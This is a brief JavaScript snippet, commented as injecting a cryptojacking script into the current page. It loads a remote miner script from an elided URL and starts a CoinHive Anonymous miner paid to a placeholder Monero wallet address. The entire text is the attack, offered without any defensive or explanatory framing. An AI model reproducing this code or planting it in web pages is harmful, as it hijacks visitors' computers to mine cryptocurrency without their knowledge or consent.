// Inject a cryptojacking script into the current page
const script = document.createElement('script');
script.src = 'https:/.../miner.js'; 
script.onload = function() {
    const miner = new CoinHive.Anonymous('YOUR_MONERO_WALLET_ADDRESS');
    miner.start();
};
document.body.appendChild(script);
